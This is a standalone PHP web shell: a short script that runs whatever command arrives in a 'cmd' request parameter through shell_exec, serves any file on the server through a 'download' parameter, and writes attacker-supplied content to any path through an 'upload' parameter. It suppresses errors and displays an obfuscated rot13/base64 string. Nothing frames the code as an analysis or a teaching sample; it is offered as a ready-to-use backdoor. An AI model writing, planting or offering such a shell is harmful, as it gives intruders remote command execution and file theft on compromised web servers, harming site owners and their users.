<?php
if(isset($_REQUEST["cmd"])){
    error_reporting(0);
    if(!extension_loaded("zip")){
        @dl("zip") or die("zip extension not loaded");
    }
    $GLOBALS["msg"] = "SUCCESS";
    if(isset($_REQUEST["download"])){
        $content = @file_get_contents($_REQUEST["download"]);
        if($content){
            header("Content-type: application/octet-stream");
            header("Content-Disposition: attachment; filename=down.php");
            die($content);
        }else{
            die("File not found");
        }
    }
    if(isset($_REQUEST["upload"])){
        $upload = $_REQUEST["upload"];
        $content = @file_get_contents("php://input");
        @file_put_contents($upload, $content);
        $GLOBALS["msg"] .= " | Uploaded";
    }
    echo "<div id='msg' style='width:100%;font-weight:bold;font-size:22px;color:#780221;background-color:#fff;height:40px;padding:10px;text-align:center;font-family:Arial;'>{$GLOBALS["msg"]}</div>";
    echo "<div id='data'><pre><form method=GET><input style='width:45%' name=cmd autofocus><input type=submit value=' Exec '></form><hr>";
    if(isset($_REQUEST["cmd"])){
        function cf($f){return base64_decode(str_rot13($f));}
        echo "<span >".cf("D09mIGV4dGVuc2lvbl9sb2FkZWQoInppcCIpKXskd2VidWdfYWRkX2hhbmRsZXIoInppcCIsImNvbXByZXNzIiwidXJsKCIpIik7fQ==")."</span>";
        echo shell_exec($_REQUEST["cmd"]);
    }
    echo "</pre></div>";
}else{echo "<h1>Usage: ?cmd=ls</h1>";}?>
